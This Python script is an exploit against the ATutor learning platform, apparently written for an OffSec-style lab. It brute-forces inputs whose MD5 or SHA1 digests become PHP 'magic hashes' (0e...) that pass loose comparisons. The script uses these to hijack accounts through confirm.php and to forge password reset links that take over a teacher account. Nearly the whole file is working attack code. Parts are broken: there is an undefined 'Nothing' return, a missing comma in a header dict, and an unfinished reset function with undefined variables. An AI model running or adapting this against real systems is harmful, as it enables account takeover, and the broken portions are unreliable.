#!/bin/env/python3
import hashlib, itertools, re, sys, requests, time

def update_email(ip, domain, id, prefix_length):
    proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}
    count = 0
    alphabet = 'abcdefghijklmnopqrstuvwxyz'
    for word in map(''.join, itertools.product(alphabet, repeat=int(prefix_length))):
        #email = '%s@%s' % (word, domain)
        email = "dlv@offsec.local"

        url = 'http://%s/ATutor/confirm.php?e=%s&m=0&id=%s' % (ip, email, id)
        print('(*) Issuing update request to URL: %s' % url) 
        r = requests.get(url, proxies=proxies, allow_redirects=False)

        if(r.status_code == 302):
            return (True, email, count)
        else:
            count += 1
    return (False, Nothing, count)

def gen_code(domain, id, date, prefix_length):
    """
    This function will brute froce to find a float in the form 0e1234567
    :param domain: domain of the target email, e.g. offsec.local
    :type domain: string
    :param id: id of target username in ATutor
    :type id: string
    :param date: date time string, YYYY-MM-DD HH:MM:SS
    :type date: date time string
    :param prefix_length: length of brute force string
    :type prefix_length: string
    """

    count = 0
    alphabet = 'abcdefghijklmnopqrstuvwxyz'
    for word in map(''.join, itertools.product(alphabet, repeat=int(prefix_length))):
        plain_text = ("%s@%s" % (word, domain) + date + id).encode('utf-8')
        hash = hashlib.md5(plain_text).hexdigest()[:10]
        if re.match(r'0+[eE]\d+$', hash):
            print('(+) Found a valid email! %s@%s' % (word, domain))
            print('(+) Request made: %d' % count)
            print('(+) Equivalent loose comparison: %s == 0\n' % (hash))
        count += 1

def gen_code2(ip, id, password):
    """
    This will be used to generate a collision with sha1 in password_reminder.php file

    :param ip: ip address of target ATutor server
    :type ip: string
    :param id: member id of the target user we are targeting
    :type id: int
    :param password: password hash of target user
    :type password: string
    """
    #g: This is current time of when the link was generated, we change this, but it needs
    #to be greater than the current time, so that it does not expire
    g = int(time.time()/60/60/24)

    r1 = re.findall('^\d+', password)
    password = int(r1[0]) if(r1) else 0

    print('(+) password: %d' % password)
    print('(+) g: %d' % g)
    print('(+) id: %d' % id)


    foundHash = False
    count = 0
    while(not foundHash):
        plain_text = (str(id + g + password)).encode('utf-8') 
        hash = hashlib.sha1(plain_text).hexdigest()[5:20]

        if re.match(r'0+[eE]\d+$', hash):
            print('(+) Found a valid g or time! %d' % (g))
            print('(+) Request made: %d' % count)
            print('(+) Equivalent loose comparison: %s == 0\n' % (hash))
            foundHash = True
            setup_atutor_password_reset(ip, id, g)
        count += 1
        g += 1

def setup_atutor_password_reset(ip, id, gen):
    """
    This will reset the password for the target user
    """
    print('(+) Attempting to reset the teacher password')
    headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1"
            }

    proxies = {'http':'http://127.0.0.1:8080'}

    s = requests.Session()

    #Need to first go to the "http://atutor/ATutor/password_reminder.php" webpage
    url = 'http://%s/ATutor/password_reminder.php' % (ip)
    r = s.get(url, headers=headers, proxies=proxies)
    res = r.text


    url = 'http://%s/ATutor/password_reminder.php?id=%s&g=%s&h=0' % (ip, str(id), str(gen))

    r = s.get(url, headers=headers, proxies=proxies)
    res = r.text

    if "Enter a new password for your account." in res:
        print('(+) Successful in submitting hash to the password reset form')

def reset_atutor_password(session, ip):
    """
    This is called after we successfuly get a hash collision in the setup_atutor_password_reset() function
    """
    headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "146",
            "Origin": "http://atutor",
            "Referer": "http://atutor/ATutor/password_reminder.php"
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1"
            }

    data = {
            "form_change": "true",
            "id": "1",
            "g": str(gen),
            "form_password_hidden": str(password),
            "password_error":"",
            "password"

            }

    proxies = {'http':'http://127.0.0.1:8080'}



def main():
    """
    This is the main function
    """

    """
    if len(sys.argv) != 5:
        print('(+) usage: %s <domain name> <id> <creation_date> <prefix_length>' % (sys.argv[0]))
        print('(+) e.g: %s offsec.local 3 "2018-06-10 23:59:59" 3' % sys.argv[0])
        sys.exit(-1)

    domain = sys.argv[1]
    id = sys.argv[2]
    creation_date = sys.argv[3]
    prefix_length = sys.argv[4]

    gen_code(domain, id, creation_date, prefix_length)

    """

    """
    if len(sys.argv) != 5:
        print('(+) usage: %s <domain_name> <id> <prefix_length> <atutor_ip>' % (sys.argv[0]))
        print('(+) e.g.: %s offsec.local 1 3 192.168.1.2' % sys.argv[0])
        sys.exit(-1)

    domain = sys.argv[1]
    id = sys.argv[2]
    prefix_length = sys.argv[3]
    ip = sys.argv[4]

    result, email, c = update_email(ip, domain, id, prefix_length)
    if(result):
        print('(+) Account hijacked with email %s using %d requests' % (email, c))
    else:
        print('(-) Account hijacking failed!')

    """
    if len(sys.argv) < 3:
        print('(+) usage: %s <target_ip> <member_id> <password_hash>' % sys.argv[0])
        print('(+) e.g.: %s 192.168.137.103 1 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e' % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
    id = int(sys.argv[2])
    password = sys.argv[3] if len(sys.argv) == 4 else "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"
    gen_code2(ip, id, password)


if __name__ == "__main__":
    main()
